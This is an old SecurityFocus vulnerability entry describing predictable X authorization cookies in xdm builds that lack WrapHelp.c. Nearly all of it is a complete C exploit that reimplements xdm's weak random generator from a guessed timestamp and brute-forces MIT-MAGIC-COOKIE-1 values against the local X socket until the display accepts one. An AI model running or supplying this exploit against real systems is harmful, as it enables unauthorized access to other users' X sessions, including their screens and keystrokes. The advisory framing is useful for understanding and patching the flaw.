source: http://www.securityfocus.com/bid/2985/info

xdm is the X Display Manager, a component of the XFree86 package. xdm manages the display of X sessions both locally and remotely.

An xdm server compiled without WrapHelp.c is vulnerable to a brute force X cookie attack, due to using trivially guessed numbers to secure the session, via gettimeofday().

This makes it possible for a remote user to potentially gain access to the display. 


/*
** xdm-cookie-exploit.c
**
** Made by (ntf & sky)
** Login    <ntf@epita.fr>, <sky@epita.fr>
**
** Last update Sun Jun 24 21:38:48 2001 root
*/
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/un.h>

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <X11/Xmd.h>
#include <X11/X.h>
#include <signal.h>

void doit(struct timeval t);
void die(char *perror_msg); /* TODO: terminal function */

#define COOKIE_SZ 16
#define TRUE  42

struct  s_x11_hdr
{
  char  endian;
  char  pad1;
  CARD16 protocol_major_version;
  CARD16 protocol_minor_version;
  CARD16 authorization_protocol_name_length;
  CARD16 authorization_protocol_data_length;
  CARD16 pad2;
  char  authorization_protocol_name[20];
  char  authorization_protocol_data[16];
};

static unsigned  long int next = 1;
static unsigned int  total = 0;

void on_sigint(int sig)
{
  printf("total: %d\n", total);
}

int main(ac,av)
int ac;
char *av[];
{
  struct timeval t;

  if (ac < 3)
    {
      fprintf (stderr, "%s: usage time_insec time_inusec\n", av[0]);
      exit (4);
    }
  t.tv_sec = atoi(av[1]);
  t.tv_usec = atoi(av[2]);
  printf("sec == %lu\nusec == %lu\n", t.tv_sec, t.tv_usec);
  doit(t);
  return (0);
}



static int inline xdm_rand(void)
{
    next = next * 1103515245 + 12345;
    return (unsigned int)(next / 65536) % 32768;
}

void print_cookie(unsigned char cookie[COOKIE_SZ])
{
  int i;

  printf("cookie=");
  for (i = 0; i < COOKIE_SZ; i++)
    printf("%02x", cookie[i]);
  printf("\n");
}


void  doit(t)
struct timeval t;
{
  unsigned char  cookie[COOKIE_SZ];
  long   ldata[2];
  struct sockaddr_un addr;
  char   buffer[1024];
  struct s_x11_hdr x11hdr;

  ldata[0] = t.tv_usec;
  ldata[1] = t.tv_sec;
  total = 0;
  x11hdr.endian = 'l';
  x11hdr.protocol_major_version = X_PROTOCOL;
  x11hdr.protocol_minor_version = X_PROTOCOL_REVISION;
  x11hdr.authorization_protocol_name_length = 18;
  x11hdr.authorization_protocol_data_length = 16;
  bcopy("MIT-MAGIC-COOKIE-1", x11hdr.authorization_protocol_name, 18);
  for (total = 0; TRUE; total++)
    {
      int fd;
      int i;

      if (!ldata[0])
 ldata[1]--;
      ldata[0]--;
      if ((fd = socket(PF_LOCAL, SOCK_STREAM, 0)) == -1)
 die("socket");
      memset(&addr, 0, sizeof(addr));
      addr.sun_family = AF_LOCAL;
      strcpy(addr.sun_path, "/tmp/.X11-unix/X0");
      if ((connect(fd, (struct sockaddr*)&addr, sizeof(addr))) == -1)
 die("connect");
      next = (ldata[0]) + (ldata[1] << 16);
      for (i = 0; i < 16; i++)
 cookie[i] = (xdm_rand() & 0xff00) >> 8;
      bcopy(cookie, x11hdr.authorization_protocol_data, 16);
      if (write(fd, &x11hdr, sizeof(x11hdr)) == -1)
 die("write");
      if (read(fd, buffer, sizeof(buffer)) == -1)
 die("read");
      if (buffer[0])
 {
   printf("SUCCESS: ");
   print_cookie(cookie);
   exit(0);
 }
      if (!(total % 1000))
 {
   printf(".");
   fflush(stdout);
 }
      close(fd);
    }
  exit(42);
}

void die(str)
char *str;
{
  perror(str);
  exit(4);
}
